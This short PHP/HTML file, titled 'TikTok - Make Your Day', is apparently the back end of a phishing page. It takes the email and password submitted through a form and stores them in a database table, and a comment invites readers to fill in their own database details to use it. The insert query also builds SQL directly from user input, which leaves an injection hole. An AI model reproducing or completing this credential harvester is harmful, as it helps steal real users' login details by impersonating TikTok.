<!DOCTYPE html>
<html>
<head>
	<title>TikTok - Make Your Day</title>
</head>
<body>

	<?php

	$EMAIL = $_POST['email'];
	$PASSWORD = $_POST['pass'];

	/* Attempt MySQL server connection. Assuming you are running MySQL
	server with default setting (user 'root' with no password) */
	$link = mysqli_connect(DONOT ATTEMPT TO ACCESS THE DATABSE, POST.PHP IN A DYNAMIC HOST);
	//IF YOU ARE ABOUT TO USE THIS CODE, REPLACE THE WARNING WITH YOUR HOSTNAME, UNAME, PASSWORD, DB NAME respectively
 
	// Check connection
	if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
	}
 
	// Attempt insert query execution
	$sql = "INSERT INTO data (username, password) VALUES ('$EMAIL', '$PASSWORD')";
	if(mysqli_query($link, $sql)){
	exit(); //header add garera rickroll garney code removed
	} else{
    echo "ERROR: Could not able to execute $sql. " . mysqli_error($link);
	}
 
	// Close connection
	mysqli_close($link);

	?>

</body>
</html>
